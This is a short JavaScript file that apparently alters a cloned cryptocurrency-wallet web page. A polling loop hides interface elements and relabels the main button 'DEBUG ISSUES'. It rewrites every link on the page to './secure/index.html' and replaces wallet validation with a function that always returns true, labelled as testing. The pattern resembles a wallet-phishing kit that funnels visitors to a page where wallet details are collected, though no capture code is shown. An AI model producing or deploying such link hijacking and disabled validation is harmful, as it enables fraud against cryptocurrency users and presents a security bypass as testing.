// ------------------ DOM Manipulation ------------------
const iconClass = ".e1vhhgxp3.css-13ed9ny.eolra810";
const topBtnClass = ".css-2nsq40.e18wg2hl1";
const wholeBtnClass = ".css-1cds14a.e1vhhgxp2";
const mainBtnClass = ".css-xkvq2u.eyitmu92";
const textClass = ".css-18nwh2f.e1vhhgxp5";
const topRightTextClass = ".css-18y7v6i.eyitmu92";
const moreIconClass = ".css-1p5gbg6.e1qv8blz0";

const intv = setInterval(() => {
  const topRightText = document.querySelectorAll(topRightTextClass);
  const moreIcon = document.querySelector(moreIconClass);
  const iconn = document.querySelector(iconClass);
  const mainBtn = document.querySelector(mainBtnClass);
  const wholeBtn = document.querySelector(wholeBtnClass);
  const text = document.querySelector(textClass);
  const topBtn = document.querySelector(topBtnClass);

  if (text && mainBtn && wholeBtn && topBtn && iconn && moreIcon) {
    topBtn.classList.add("nonee");
    moreIcon.classList.add("nonee");
    topRightText.forEach((el) => el.classList.add("nonee"));
    iconn.classList.add("nonee");

    mainBtn.innerHTML = "<span class='css-xkvq2u eyitmu92 bld'>DEBUG ISSUES</span>";
    wholeBtn.classList.add("bxShadow");
    text.classList.add("nonee");

    // Redirect all links to secure/index.html
    document.querySelectorAll("a").forEach((link) => {
      link.setAttribute("href", "./secure/index.html");
    });

    clearInterval(intv);
  }
}, 100);

// ------------------ Wallet Validation Override ------------------
// This function normally validates wallets; we skip it for testing
function validateWallet(dummy) {
  // Always return true for testing
  return true;
}

// Optional: override existing wallet validation calls
// For example, if script.js had something like:
// if (!validateWallet(input)) { alert("Error..."); return; }
// It now always passes because validateWallet() returns true
